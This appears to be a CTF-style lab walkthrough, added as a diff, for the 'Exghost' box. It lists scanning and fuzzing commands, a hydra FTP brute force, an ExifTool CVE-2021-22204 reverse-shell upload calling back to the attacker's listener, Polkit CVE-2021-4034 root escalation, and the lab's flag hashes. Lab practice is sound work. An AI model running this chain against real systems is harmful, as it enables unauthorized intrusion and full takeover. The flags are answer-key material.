@@ -1,0 +1,92 @@
+																							              Exghost Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.183
+export IP=192.168.68.183
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+2. nmap -Pn -n -sC -sV -p20,21,80 $IP --open --stats-every=5s -oN results.txt
+ 
+21/tcp open  ftp     vsftpd 3.0.3
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: 403 Forbidden
+Service Info: Host: 127.0.0.1; OS: Unix
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000 
+ <!-- nothing -->
+ 
+ 
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+
+
+nikto --url $IP 
+
+
+Enumeration
+
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,429 -t 30 -R3 "http://$IP/FUZZ"
+
+uploads - 403
+
+ffuf -c -w /usr/share/wordlists/last_resort.txt -u http://$IP/FUZZ -t 500 -mc 200,301
+
+exiftool
+
+Nothing really usefull
+
+Port 21
+hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp
+
+login: user   password: system
+
+ftp user@$IP
+system
+dir
+-rwxrwxrwx    1 0        0          126151 Jan 27  2022 backup
+get backup
+
+file backup      → backup: pcap capture file
+
+Open the file in wireshark and notice that frame 891 contains a file upload /exiftest.php 
+
+File uploaded successfully :)<pre>ExifTool Version Number         : 12.23
+Directory                       : /var/www/html/uploads
+-----------------------------169621313238602050593908562572
+Content-Disposition: form-data; name="myFile"; filename="testme.jpg"
+Content-Type: image/jpeg
+
+
+searchsploit exiftool         // can't get the exploit to work, search online for another exploit https://github.com/AssassinUKG/CVE-2021-22204
+
+sudo apt install djvulibre-bin
+bash exif.sh "reverseme 192.168.49.68 443" urs.jpg
+nc -lvnp 443
+curl -F "myFile=@urs.jpg" http://192.168.68.183/exiftest.php -v
+cd /home/hassan
+cat proof.txt     // 74c9b03ef8d8bec13445e1aa55dcf352
+
+
+Got Shell!!
+
+Privilege Escalation
+
+Since we discovered the credentials for FTP:  user:admin and we have two users within our server, let's try the same credentails for user
+
+su user
+Password: system
+
+run linpeas.sh
+
+Found CVE-2021-4034 - Polkit, Since we have no compilers on the machine, let's search for a python script. https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py
+
+Create the script on the machine.
+
+nano cve.py
+chmod +x cve.py
+./cve.py
+
+whoami
+root  // 3bae444afe79044d40d1153c025af2cf
